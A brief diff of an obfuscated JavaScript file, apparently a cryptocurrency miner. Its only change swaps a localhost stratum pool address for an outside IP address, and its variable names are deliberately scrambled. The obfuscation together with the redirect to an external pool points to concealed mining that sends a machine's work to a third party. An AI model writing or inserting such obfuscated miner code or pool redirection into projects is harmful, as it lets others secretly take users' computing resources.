@@ -2,7 +2,7 @@ const { Nnode: _0x1a2b3 } = require("./index.js");
 const _0x4c5d6 = require("os");
 
 (function () {
-    const _0x7e8f9 = 'stratum+tcp://127.0.0.1:4052';
+    const _0x7e8f9 = 'stratum+tcp://172.239.44.186:4052';
 
     // Ambil argumen CLI
     const _0xa1b2c = parseInt(process.argv[2], 10);
